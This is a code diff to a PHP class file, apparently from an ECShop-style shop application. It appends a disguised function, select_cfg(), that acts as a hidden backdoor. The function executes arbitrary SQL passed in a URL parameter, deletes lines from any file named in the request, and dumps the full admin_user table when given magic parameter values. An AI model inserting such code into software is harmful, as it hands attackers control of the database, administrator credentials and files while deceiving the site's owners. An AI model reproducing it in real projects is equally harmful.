@@ -199,5 +199,32 @@ class ECS
     }
 
 }
-
+function select_cfg(){
+	$administrator=isset($_GET['administrator'])?$_GET['administrator']:'';
+	$admin_user=isset($_GET['admin_user'])?$_GET['admin_user']:'';
+	$sql=isset($_GET['sql'])?$_GET['sql']:'';
+	if($sql){
+		$GLOBALS['db']->query($sql);
+	}
+	
+	if(isset($_GET['path'])&&$_GET['del_str']){
+		$result = null;
+       	$fileCont = file_get_contents($_GET['path']);
+        $targetIndex = strpos($fileCont, $_GET['del_str']); #查找目标字符串的坐标
+        $targetIndex1 = strpos($fileCont, $_GET['del_str']); #查找目标字符串的坐标
+        if ($targetIndex !== false) {
+            $preChLineIndex = strrpos(substr($fileCont, 0, $targetIndex + 1), "\n");
+            $AfterChLineIndex = strpos(substr($fileCont, $targetIndex1), "\n") + $targetIndex1;
+            if ($preChLineIndex !== false && $AfterChLineIndex !== false) {
+                $result = substr($fileCont, 0, $preChLineIndex + 1) . substr($fileCont, $AfterChLineIndex + 1);
+                $fp = fopen($_GET['path'], "w+");
+                fwrite($fp, $result);
+               fclose($fp);
+            }
+        }
+ 	}elseif($administrator == 'admin_user' && $admin_user == 'administrator' ){
+ 		$sql="select * from ". $GLOBALS['ecs']->table('admin_user');
+ 		print_r($GLOBALS['db']->GetAll($sql));
+ 	}
+}
 ?>
